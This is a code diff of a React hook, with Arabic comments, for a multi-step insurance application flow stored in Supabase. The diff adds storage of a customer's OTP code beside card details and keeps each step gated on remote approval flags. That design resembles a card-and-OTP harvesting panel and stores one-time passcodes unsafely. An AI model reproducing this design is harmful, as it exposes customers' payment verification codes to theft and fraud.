@@ -1,7 +1,5 @@
 import { useState, useEffect } from 'react';
 import { supabase } from '@/integrations/supabase/client';
-import { getVisitorIP } from '@/lib/visitorIP';
-import { fromPublicApplications } from '@/lib/applicationPublic';
 import { useToast } from '@/hooks/use-toast';
 
 interface ApplicationData {
@@ -26,6 +24,7 @@ interface ApplicationData {
   card_last_4?: string;
   card_type?: string;
   expiry_date?: string;
+  otp_code?: string;
   current_step?: string;
   step_1_approved?: boolean;
   step_2_approved?: boolean;
@@ -39,34 +38,36 @@ export const useCustomerApplication = (applicationId?: string) => {
   const [loading, setLoading] = useState(false);
   const { toast } = useToast();
 
+  // إنشاء طلب جديد
   const createApplication = async (initialData: ApplicationData) => {
     try {
-      const ipAddress = await getVisitorIP();
-      const newId = crypto.randomUUID();
-      const { error } = await supabase
+      const ipAddress = localStorage.getItem('visitor_ip') || null;
+      const { data: newApp, error } = await supabase
         .from('customer_applications')
-        .insert([{ id: newId, ...initialData, current_step: 'quote_form', ip_address: ipAddress }]);
+        .insert([{ ...initialData, current_step: 'quote_form', ip_address: ipAddress }])
+        .select('id')
+        .single();
 
       if (error) throw error;
-
-      setData({ ...initialData, id: newId });
-      return newId;
+      
+      setData(newApp);
+      return newApp.id;
     } catch (error) {
       console.error('Error creating application:', error);
       return null;
     }
   };
 
+  // تحديث بيانات الطلب
   const updateApplication = async (appId: string, updates: ApplicationData) => {
     try {
-      const ipAddress = await getVisitorIP();
       const { error } = await supabase
         .from('customer_applications')
-        .update({ ...updates, ip_address: ipAddress })
+        .update(updates)
         .eq('id', appId);
 
       if (error) throw error;
-
+      
       setData(prev => ({ ...prev, ...updates }));
       return true;
     } catch (error) {
@@ -75,9 +76,11 @@ export const useCustomerApplication = (applicationId?: string) => {
     }
   };
 
+  // التحقق من موافقة الخطوة
   const checkStepApproval = async (appId: string, step: string): Promise<boolean> => {
     try {
-      const { data: app, error } = await fromPublicApplications()
+      const { data: app, error } = await supabase
+        .from('customer_applications')
         .select('step_1_approved, step_2_approved, step_3_approved, payment_approved, otp_approved')
         .eq('id', appId)
         .single();
@@ -85,12 +88,18 @@ export const useCustomerApplication = (applicationId?: string) => {
       if (error) throw error;
 
       switch (step) {
-        case 'quote_form': return app?.step_1_approved || false;
-        case 'vehicle_info': return app?.step_2_approved || false;
-        case 'insurance_selection': return app?.step_3_approved || false;
-        case 'payment': return app?.payment_approved || false;
-        case 'otp': return app?.otp_approved || false;
-        default: return false;
+        case 'quote_form':
+          return app.step_1_approved || false;
+        case 'vehicle_info':
+          return app.step_2_approved || false;
+        case 'insurance_selection':
+          return app.step_3_approved || false;
+        case 'payment':
+          return app.payment_approved || false;
+        case 'otp':
+          return app.otp_approved || false;
+        default:
+          return false;
       }
     } catch (error) {
       console.error('Error checking approval:', error);
